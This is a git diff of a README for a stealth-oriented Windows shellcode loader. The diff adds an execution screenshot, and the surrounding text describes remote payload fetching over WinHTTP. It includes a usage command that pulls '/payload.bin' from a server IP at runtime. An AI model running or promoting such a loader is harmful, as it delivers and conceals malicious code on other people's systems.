@@ -4,6 +4,12 @@ A feature-rich, stealth-oriented Windows shellcode loader written in C++ utilizi
 
 ---
 
+## Process Execution Screenshot
+
+![Loader Execution Process](img/Capture.png)
+
+---
+
 ## Key Features
 
 * **Remote Payload Fetching:** Downloads raw shellcode dynamically over HTTP using the native Windows WinHTTP API.
@@ -34,3 +40,4 @@ You can specify custom server IP and payload paths at runtime:
 
 ```bash
 ShellcodeLoader.exe -server 192.168.1.100 -path /payload.bin
+```
